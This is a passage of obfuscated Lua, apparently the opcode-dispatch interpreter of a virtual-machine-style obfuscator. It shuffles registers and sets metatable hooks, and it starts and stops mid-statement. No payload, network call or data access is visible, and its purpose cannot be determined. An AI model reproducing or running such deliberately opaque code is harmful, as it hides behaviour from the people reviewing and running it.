y=f[n];else w[y[131]]=y[834];end else if q<=7 then n=n+1;else if 9>q then y=f[n];else w[y[131]]=y[834];end end end end else if q<=14 then if q<=11 then if q==10 then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=y[834];else if q==13 then n=n+1;else y=f[n];end end end else if q<=17 then if q<=15 then bc=y[131]else if 16<q then p=bb+bc-1 else ba,bb=i(w[bc](r(w,bc+1,y[834])))end end else if q<=18 then x=0;else if q==19 then for bb=bc,p do x=x+1;w[bb]=ba[x];end;else break end end end end end q=q+1 end end;elseif(258>=z)then if(255==z or 255>z)then if(253>z or 253==z)then a(c,e);elseif not(254~=z)then w[y[131]]=(w[y[834]]*y[784]);else for q=y[131],y[834],1 do w[q]=nil;end;end;elseif(256>z or 256==z)then do return end;elseif not(258==z)then w[y[131]]=b(d[y[834]],nil,j);else local q=0 while true do if q<=6 then if q<=2 then if q<=0 then w={};else if q~=2 then for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;else n=n+1;end end else if q<=4 then if 3==q then y=f[n];else w[y[131]]=j[y[834]];end else if q>5 then y=f[n];else n=n+1;end end end else if q<=10 then if q<=8 then if q>7 then n=n+1;else w[y[131]]=w[y[834]];end else if 9<q then for x=y[131],y[834],1 do w[x]=nil;end;else y=f[n];end end else if q<=12 then if 11==q then n=n+1;else y=f[n];end else if q~=14 then n=y[834];else break end end end end q=q+1 end end;elseif z<=261 then if(259==z or(259>z))then local q,x,ba,bb=0 while true do if q<=9 then if(q<=4)then if q<=1 then if(q==0)then x=nil else ba=nil end else if q<=2 then bb=nil else if 4>q then w[y[131]]=h[y[834]];else n=n+1;end end end else if(q<=6)then if(5<q)then w[y[131]]=h[y[834]];else y=f[n];end else if(q==7 or q<7)then n=n+1;else if q<9 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if(q<=14)then if(q<11 or q==11)then if q>10 then y=f[n];else n=n+1;end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if(q~=14)then n=n+1;else y=f[n];end end end else if q<=16 then if not(15~=q)then bb=y[131]else ba={w[bb](w[bb+1])};end else if(q<=17)then x=0;else if q<19 then for bc=bb,y[784]do x=(x+1);w[bc]=ba[x];end else break end end end end end q=q+1 end elseif not(z==261)then local q,x,ba,bb=0 while true do if(q<=16)then if(q<=7)then if(q<=3)then if q<=1 then if(q<1)then x=nil else ba=nil end else if(q~=3)then bb=nil else w[y[131]]=h[y[834]];end end else if(q==5 or q<5)then if(5>q)then n=n+1;else y=f[n];end else if(6<q)then n=n+1;else w[y[131]]=w[y[834]][y[784]];end end end else if(q==11 or q<11)then if q<=9 then if 8==q then y=f[n];else w[y[131]]=h[y[834]];end else if 11>q then n=n+1;else y=f[n];end end else if(q==13 or q<13)then if 12==q then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if(q==14 or q<14)then y=f[n];else if q>15 then n=(n+1);else w[y[131]]=w[y[834]][w[y[784]]];end end end end end else if(q<=25)then if(q<20 or q==20)then if q<=18 then if(17==q)then y=f[n];else w[y[131]]=h[y[834]];end else if not(q~=19)then n=(n+1);else y=f[n];end end else if(q<=22)then if q~=22 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if(q<23 or q==23)then y=f[n];else if not(25==q)then w[y[131]]=j[y[834]];else n=(n+1);end end end end else if q<=29 then if(q<=27)then if not(26~=q)then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if 28<q then y=f[n];else n=(n+1);end end else if(q==31 or q<31)then if not(q~=30)then bb=y[834];else ba=y[784];end else if(q==32 or q<32)then x=k(w,g,bb,ba);else if 33<q then break else w[y[131]]=x;end end end end end end q=(q+1)end else local q,x,ba,bb=0 while true do if(q<9 or q==9)then if q<=4 then if(q==1 or q<1)then if q~=1 then x=nil else ba=nil end else if(q<2 or q==2)then bb=nil else if not(3~=q)then w[y[131]]=h[y[834]];else n=(n+1);end end end else if(q<=6)then if not(q~=5)then y=f[n];else w[y[131]]=h[y[834]];end else if(q==7 or q<7)then n=(n+1);else if q<9 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if(q<14 or q==14)then if(q<=11)then if 10<q then y=f[n];else n=n+1;end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if 14>q then n=(n+1);else y=f[n];end end end else if(q<16 or q==16)then if(q<16)then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 18==q then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=(q+1)end end;elseif(262>=z)then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[131]]=w[y[834]][y[784]];end else if 3>q then n=n+1;else y=f[n];end end else if q<=5 then if 4==q then w[y[131]]=y[834];else n=n+1;end else if 6<q then w[y[131]]=y[834];else y=f[n];end end end else if q<=11 then if q<=9 then if q==8 then n=n+1;else y=f[n];end else if 11>q then w[y[131]]=y[834];else n=n+1;end end else if q<=13 then if q>12 then x=y[131]else y=f[n];end else if q<15 then w[x]=w[x](r(w,x+1,y[834]))else break end end end end q=q+1 end elseif not(263~=z)then w[y[131]]();else local q=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0==q then w[y[131]][y[834]]=y[784];else n=n+1;end else if q<=2 then y=f[n];else if 4~=q then w[y[131]]={};else n=n+1;end end end else if q<=6 then if 6~=q then y=f[n];else w[y[131]][y[834]]=w[y[784]];end else if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[131]]=h[y[834]];end end end end else if q<=14 then if q<=11 then if 10==q then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][y[784]];else if 13<q then y=f[n];else n=n+1;end end end else if q<=16 then if q<16 then w[y[131]][y[834]]=w[y[784]];else n=n+1;end else if q<=17 then y=f[n];else if q~=19 then w[y[131]][y[834]]=w[y[784]];else break end end end end end q=q+1 end end;elseif 276>=z then if z<=270 then if z<=267 then if 265>=z then local q=y[131]local x,ba=i(w[q](w[q+1]))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;elseif 267~=z then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;else w[y[131]]=false;n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];if(w[y[131]]~=y[784])then n=n+1;else n=y[834];end;end;elseif z<=268 then w[y[131]]=w[y[834]][w[y[784]]];elseif 269==z then j[y[834]]=w[y[131]];else local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];q=y[131]w[q]=w[q](w[q+1])end;elseif z<=273 then if(z<=271)then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q==0 then x=nil else w[y[131]]=h[y[834]];end else if 3>q then n=n+1;else y=f[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if q==6 then y=f[n];else w[y[131]]=y[834];end end end else if q<=11 then if q<=9 then if q==8 then n=n+1;else y=f[n];end else if 11>q then w[y[131]]=y[834];else n=n+1;end end else if q<=13 then if 13~=q then y=f[n];else x=y[131]end else if q<15 then w[x]=w[x](r(w,x+1,y[834]))else break end end end end q=q+1 end elseif 272<z then local q,x=0 while true do if q<=13 then if q<=6 then if q<=2 then if q<=0 then x=nil else if 2~=q then w[y[131]]={};else n=n+1;end end else if q<=4 then if q<4 then y=f[n];else w[y[131]]=h[y[834]];end else if q<6 then n=n+1;else y=f[n];end end end else if q<=9 then if q<=7 then w[y[131]]=w[y[834]][y[784]];else if q~=9 then n=n+1;else y=f[n];end end else if q<=11 then if 10==q then w[y[131]][y[834]]=w[y[784]];else n=n+1;end else if 12<q then w[y[131]]=j[y[834]];else y=f[n];end end end end else if q<=20 then if q<=16 then if q<=14 then n=n+1;else if 16~=q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if q<=18 then if q<18 then n=n+1;else y=f[n];end else if 19<q then n=n+1;else w[y[131]]=j[y[834]];end end end else if q<=23 then if q<=21 then y=f[n];else if 23~=q then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=25 then if 24==q then y=f[n];else x=y[131]end else if q>26 then break else w[x]=w[x]()end end end end end q=q+1 end else local q,x=0 while true do if q<=14 then if q<=6 then if q<=2 then if q<=0 then x=nil else if q~=2 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=4 then if q==3 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if 6~=q then n=n+1;else y=f[n];end end end else if q<=10 then if q<=8 then if q~=8 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if 9<q then w[y[131]]=w[y[834]]*y[784];else y=f[n];end end else if q<=12 then if 11==q then n=n+1;else y=f[n];end else if q==13 then w[y[131]]=w[y[834]]+w[y[784]];else n=n+1;end end end end else if q<=22 then if q<=18 then if q<=16 then if 15==q then y=f[n];else w[y[131]]=j[y[834]];end else if q~=18 then n=n+1;else y=f[n];end end else if q<=20 then if q==19 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if q==21 then y=f[n];else w[y[131]]=w[y[834]];end end end else if q<=26 then if q<=24 then if q>23 then y=f[n];else n=n+1;end else if q==25 then w[y[131]]=w[y[834]]+w[y[784]];else n=n+1;end end else if q<=28 then if 28~=q then y=f[n];else x=y[131]end else if 30~=q then w[x]=w[x](r(w,x+1,y[834]))else break end end end end end q=q+1 end end;elseif z<=274 then local q;local x;local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];ba=y[131]x={w[ba](w[ba+1])};q=0;for bb=ba,y[784]do q=q+1;w[bb]=x[q];end elseif 275==z then local q;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))else w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];end;elseif z<=282 then if z<=279 then if 277>=z then local q;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))elseif z~=279 then local q;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))else local q;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))end;elseif z<=280 then w[y[131]][y[834]]=y[784];elseif z==281 then local q=y[131]w[q]=w[q](r(w,q+1,y[834]))else local q;local x;local ba;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]x={w[ba](w[ba+1])};q=0;for bb=ba,y[784]do q=q+1;w[bb]=x[q];end end;elseif 285>=z then if 283>=z then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0<q then ba=nil else x=nil end else if q<=2 then bb=nil else if q==3 then w[y[131]]=h[y[834]];else n=n+1;end end end else if q<=6 then if q>5 then w[y[131]]=h[y[834]];else y=f[n];end else if q<=7 then n=n+1;else if q>8 then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end end else if q<=14 then if q<=11 then if 10==q then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if 14~=q then n=n+1;else y=f[n];end end end else if q<=16 then if q~=16 then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q~=19 then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end elseif 284==z then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q<1 then x=nil else ba=nil end else if q<=2 then bb=nil else if 3==q then w[y[131]]=h[y[834]];else n=n+1;end end end else if q<=6 then if 6>q then y=f[n];else w[y[131]]=h[y[834]];end else if q<=7 then n=n+1;else if 9~=q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if q<=14 then if q<=11 then if 11>q then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if 13==q then n=n+1;else y=f[n];end end end else if q<=16 then if q<16 then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 19~=q then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end else local q,x=0 while true do if q<=17 then if q<=8 then if q<=3 then if q<=1 then if q<1 then x=nil else w={};end else if q<3 then for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else n=n+1;end end else if q<=5 then if 4<q then w[y[131]]={};else y=f[n];end else if q<=6 then n=n+1;else if q<8 then y=f[n];else w[y[131]]=h[y[834]];end end end end else if q<=12 then if q<=10 then if q<10 then n=n+1;else y=f[n];end else if q~=12 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if q<=14 then if 13<q then w[y[131]]=h[y[834]];else y=f[n];end else if q<=15 then n=n+1;else if 16<q then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end end end else if q<=26 then if q<=21 then if q<=19 then if 18==q then n=n+1;else y=f[n];end else if 21~=q then w[y[131]]={};else n=n+1;end end else if q<=23 then if 23>q then y=f[n];else w[y[131]]=y[834];end else if q<=24 then n=n+1;else if q>25 then w[y[131]]=y[834];else y=f[n];end end end end else if q<=30 then if q<=28 then if 27==q then n=n+1;else y=f[n];end else if 29==q then w[y[131]]=y[834];else n=n+1;end end else if q<=32 then if q~=32 then y=f[n];else x=y[131];end else if q<=33 then w[x]=w[x]-w[x+2];else if 35>q then n=y[834];else break end end end end end end q=q+1 end end;elseif 286>=z then local q;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][w[y[834]]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];q=y[131]w[q]=w[q](w[q+1])elseif z<288 then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];n=y[834];else local q;local x;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];x=y[131];q=w[x];for ba=x+1,y[834]do t(q,w[ba])end;end;elseif z<=336 then if 312>=z then if z<=300 then if(294>z or 294==z)then if(291>z or 291==z)then if(289>=z)then local q=0 while true do if(q<=6)then if q<=2 then if(q==0 or q<0)then w[y[131]]=w[y[834]][y[784]];else if not(not(q==1))then n=(n+1);else y=f[n];end end else if(q==4 or q<4)then if(q==3)then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if(6>q)then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if(q==9 or q<9)then if(q==7 or q<7)then n=(n+1);else if not(9==q)then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if(q<11 or q==11)then if(10<q)then y=f[n];else n=(n+1);end else if(not(q==13))then if w[y[131]]then n=n+1;else n=y[834];end;else break end end end end q=q+1 end elseif(290==z)then local q=0 while true do if q<=14 then if q<=6 then if q<=2 then if(q==0 or q<0)then w={};else if not(2==q)then for x=0,u,1 do if x<o then w[x]=s[(x+1)];else break;end;end;else n=n+1;end end else if q<=4 then if(4~=q)then y=f[n];else w[y[131]]=h[y[834]];end else if not(q==6)then n=(n+1);else y=f[n];end end end else if q<=10 then if(q<8 or q==8)then if(7<q)then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if 9==q then y=f[n];else w[y[131]]=h[y[834]];end end else if q<=12 then if q<12 then n=(n+1);else y=f[n];end else if(q>13)then n=(n+1);else w[y[131]]={};end end end end else if q<=21 then if(q<17 or q==17)then if q<=15 then y=f[n];else if q<17 then w[y[131]]={};else n=(n+1);end end else if q<=19 then if 18<q then w[y[131]][y[834]]=w[y[784]];else y=f[n];end else if(q~=21)then n=(n+1);else y=f[n];end end end else if(q==25 or q<25)then if(q==23 or q<23)then if q==22 then w[y[131]]=j[y[834]];else n=n+1;end else if(q~=25)then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if(q<=27)then if not(q~=26)then n=n+1;else y=f[n];end else if q>28 then break else if w[y[131]]then n=(n+1);else n=y[834];end;end end end end end q=(q+1)end else local q,x=0 while true do if(q<8 or q==8)then if(q<=3)then if(q<=1)then if(0<q)then w[y[131]]=w[y[834]][y[784]];else x=nil end else if 3~=q then n=(n+1);else y=f[n];end end else if q<=5 then if(q>4)then n=(n+1);else w[y[131]]=w[y[834]][y[784]];end else if(q<=6)then y=f[n];else if(q<8)then w[y[131]]=w[y[834]][y[784]];else n=(n+1);end end end end else if(q<13 or q==13)then if(q<=10)then if q==9 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if q<=11 then n=(n+1);else if(q==12)then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if(q<15 or q==15)then if(14==q)then n=(n+1);else y=f[n];end else if(q<16 or q==16)then x=y[131]else if not(q==18)then w[x]=w[x](w[x+1])else break end end end end end q=q+1 end end;elseif(z<=292)then local q,x=0 while true do if q<=10 then if q<=4 then if q<=1 then if 0==q then x=nil else w[y[131]]=j[y[834]];end else if q<=2 then n=n+1;else if q==3 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if q<=7 then if q<=5 then n=n+1;else if q>6 then w[y[131]]=y[834];else y=f[n];end end else if q<=8 then n=n+1;else if q>9 then w[y[131]]=y[834];else y=f[n];end end end end else if q<=15 then if q<=12 then if 11==q then n=n+1;else y=f[n];end else if q<=13 then w[y[131]]=y[834];else if q<15 then n=n+1;else y=f[n];end end end else if q<=18 then if q<=16 then w[y[131]]=y[834];else if q==17 then n=n+1;else y=f[n];end end else if q<=19 then x=y[131]else if 21>q then w[x]=w[x](r(w,x+1,y[834]))else break end end end end end q=q+1 end elseif(293<z)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q~=1 then x=nil else ba=nil end else if q<=2 then bb=nil else if q<4 then w[y[131]]=h[y[834]];else n=n+1;end end end else if q<=6 then if q==5 then y=f[n];else w[y[131]]=h[y[834]];end else if q<=7 then n=n+1;else if q<9 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if q<=14 then if q<=11 then if q~=11 then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if 13<q then y=f[n];else n=n+1;end end end else if q<=16 then if 16>q then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 19~=q then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=16 then if q<=7 then if q<=3 then if q<=1 then if q>0 then ba=nil else x=nil end else if 3~=q then bb=nil else w[y[131]]=h[y[834]];end end else if q<=5 then if q==4 then n=n+1;else y=f[n];end else if 7>q then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end else if q<=11 then if q<=9 then if 8<q then w[y[131]]=h[y[834]];else y=f[n];end else if q==10 then n=n+1;else y=f[n];end end else if q<=13 then if 12<q then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if q<=14 then y=f[n];else if q<16 then w[y[131]]=w[y[834]][w[y[784]]];else n=n+1;end end end end end else if q<=25 then if q<=20 then if q<=18 then if 18>q then y=f[n];else w[y[131]]=h[y[834]];end else if q<20 then n=n+1;else y=f[n];end end else if q<=22 then if 21<q then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if q<=23 then y=f[n];else if q<25 then w[y[131]]=j[y[834]];else n=n+1;end end end end else if q<=29 then if q<=27 then if q==26 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if 28<q then y=f[n];else n=n+1;end end else if q<=31 then if 30<q then ba=y[784];else bb=y[834];end else if q<=32 then x=k(w,g,bb,ba);else if q~=34 then w[y[131]]=x;else break end end end end end end q=q+1 end end;elseif(297>=z)then if(295==z or 295>z)then local q=0 while true do if q<=6 then if(q==2 or q<2)then if q<=0 then w[y[131]]=w[y[834]][y[784]];else if(1<q)then y=f[n];else n=(n+1);end end else if(q<=4)then if not(4==q)then w[y[131]]=w[y[834]][y[784]];else n=(n+1);end else if 5==q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if q<=9 then if(q<7 or q==7)then n=n+1;else if(8==q)then y=f[n];else w[y[131]][y[834]]=w[y[784]];end end else if(q==11 or q<11)then if not(q==11)then n=n+1;else y=f[n];end else if 13~=q then n=y[834];else break end end end end q=q+1 end elseif z>296 then local q,x,ba,bb=0 while true do if q<=16 then if q<=7 then if q<=3 then if q<=1 then if q~=1 then x=nil else ba=nil end else if 3~=q then bb=nil else w[y[131]]=h[y[834]];end end else if q<=5 then if 4==q then n=n+1;else y=f[n];end else if q==6 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end else if q<=11 then if q<=9 then if q~=9 then y=f[n];else w[y[131]]=h[y[834]];end else if 11>q then n=n+1;else y=f[n];end end else if q<=13 then if 12<q then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if q<=14 then y=f[n];else if q<16 then w[y[131]]=w[y[834]][w[y[784]]];else n=n+1;end end end end end else if q<=25 then if q<=20 then if q<=18 then if q<18 then y=f[n];else w[y[131]]=h[y[834]];end else if q>19 then y=f[n];else n=n+1;end end else if q<=22 then if q<22 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if q<=23 then y=f[n];else if q>24 then n=n+1;else w[y[131]]=j[y[834]];end end end end else if q<=29 then if q<=27 then if 27~=q then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if q<29 then n=n+1;else y=f[n];end end else if q<=31 then if 30<q then ba=y[784];else bb=y[834];end else if q<=32 then x=k(w,g,bb,ba);else if q~=34 then w[y[131]]=x;else break end end end end end end q=q+1 end else if(not(w[y[131]]==y[784]))then n=y[834];else n=n+1;end;end;elseif(298==z or 298>z)then local q=y[131];local x=w[q];for ba=(q+1),p do t(x,w[ba])end;elseif(z<300)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if 1>q then x=nil else ba=nil end else if q<=2 then bb=nil else if q~=4 then w[y[131]]=h[y[834]];else n=n+1;end end end else if q<=6 then if 6>q then y=f[n];else w[y[131]]=h[y[834]];end else if q<=7 then n=n+1;else if q==8 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if q<=14 then if q<=11 then if q~=11 then n=n+1;else y=f[n];end else if q<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if 14>q then n=n+1;else y=f[n];end end end else if q<=16 then if q<16 then bb=y[131]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if q~=19 then for bc=bb,y[784]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q>0 then w[y[131]]=w[y[834]];else x=nil end else if 3>q then n=n+1;else y=f[n];end end else if q<=5 then if q~=5 then w[y[131]]=y[834];else n=n+1;end else if 6<q then w[y[131]]=y[834];else y=f[n];end end end else if q<=11 then if q<=9 then if 9~=q then n=n+1;else y=f[n];end else if q<11 then w[y[131]]=y[834];else n=n+1;end end else if q<=13 then if 13>q then y=f[n];else x=y[131]end else if q>14 then break else w[x]=w[x](r(w,x+1,y[834]))end end end end q=q+1 end end;elseif z<=306 then if 303>=z then if 301>=z then local q;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];q=y[131]w[q]=w[q](w[q+1])elseif z>302 then local q=y[131];do return w[q](r(w,q+1,y[834]))end;else local d=d[y[834]];local q={};local x={};for ba=1,y[784]do n=n+1;local bb=f[n];if bb[250]==365 then x[ba-1]={w,bb[834]};else x[ba-1]={h,bb[834]};end;v[#v+1]=x;end;m(q,{['\95\95\105\110\100\101\120']=function(m,m)local m=x[m];return m[1][m[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(m,m,v)local m=x[m]m[1][m[2]]=v;end;});w[y[131]]=b(d,q,j);end;elseif z<=304 then w[y[131]]=w[y[834]]+w[y[784]];elseif z<306 then local 